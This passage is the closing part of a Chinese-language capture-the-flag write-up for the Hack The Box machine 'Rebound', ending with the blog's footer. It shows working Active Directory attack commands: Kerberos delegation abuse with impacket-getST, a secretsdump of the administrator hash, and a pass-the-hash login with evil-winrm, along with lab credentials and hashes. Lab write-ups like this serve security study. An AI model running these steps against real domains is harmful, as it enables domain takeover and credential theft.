<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">faketime <span class="string">&#x27;402 minutes&#x27;</span> impacket-getST -spn browser/dc01.rebound.htb rebound.htb/ldap_monitor:<span class="string">&#x27;1GR8t@$$4u&#x27;</span> -impersonate DC01$</span><br></pre></td></tr></table></figure>
<p>出现<code>KDC_ERR_BADOPTION(KDC cannot accommodate requested option)</code>报错就重新添加一下委派</p>
<p>这时生成的是一张可转发的票据</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-describeTicket DC01\<span class="variable">$@browser_dc01</span>.rebound.htb@REBOUND.HTB.ccache</span><br></pre></td></tr></table></figure>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250226195250.png" alt="微信截图_20250226195250"></p>
<p>现在，我已经拥有了一张作为 <code>DC01$</code> 针对 <code>delegator$</code> 的服务票据ST，<code>delegator$</code> 可以利用这张票据以及约束委派权限，获取一张针对 <code>DC01</code> 的 <code>DC01$</code> 服务票据。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">faketime <span class="string">&#x27;402 minutes&#x27;</span> impacket-getST rebound.htb/delegator\$ -hashes :45326e68995ec3b859228fd504be8617 -spn http/dc01.rebound.htb -additional-ticket DC01\<span class="variable">$@browser_dc01</span>.rebound.htb@REBOUND.HTB.ccache -impersonate DC01$</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>-additional-ticket</code>：指定可转发票据，我们将其直接传递给S4U2Proxy，从而能够获取一张针对域控制器的 <code>DC01$</code> 服务票据ST</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KRB5CCNAME=DC01<span class="variable">$@http_dc01</span>.rebound.htb@REBOUND.HTB.ccache secretsdump.py -k -no-pass dc01.rebound.htb -just-dc-user administrator</span><br></pre></td></tr></table></figure>
<blockquote>
<p>利用NTDS.DIT数据库解密</p>
<p><code>-just-dc-ntlm</code>：所有的NTLM哈希</p>
<p><code>-just-dc-user</code>：指定的用户哈希</p>
</blockquote>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250226211052.png" alt="微信截图_20250226211052"></p>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250226211114.png" alt="微信截图_20250226211114"></p>
<h2 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h2><p>winrm登录即可</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.11.231 -u administrator -H 176be138594933bb67db3b2572fc91b8</span><br></pre></td></tr></table></figure>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250226211553.png" alt="微信截图_20250226211553"></p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Chromos2me, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/Pentest/" class="tag">#Pentest</a><a href="/tags/Active-Directory/" class="tag">#Active Directory</a><a href="/tags/Relay-Attack/" class="tag">#Relay Attack</a><a href="/tags/RBCD-Attack/" class="tag">#RBCD Attack</a><a href="/tags/Potato/" class="tag">#Potato</a><a href="/tags/Bloodhound/" class="tag">#Bloodhound</a><a href="/tags/Roasting/" class="tag">#Roasting</a><a href="/tags/Crypto-Spray/" class="tag">#Crypto Spray</a><a href="/tags/Shadow-Credentials/" class="tag">#Shadow Credentials</a><a href="/tags/Enumerate/" class="tag">#Enumerate</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2025/03/08/OpSalwarKameez24-1/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">HTB-OpSalwarKameez24-1 Super-Star</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2025/01/22/HTB-CrownJewel-1/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">HTB-CrownJewel-1</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/Chromos2me" class="item">GitHub</a>
                
                <a href="3079749425@qq.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2025 Chromos2me<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    <script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
</body>
</html>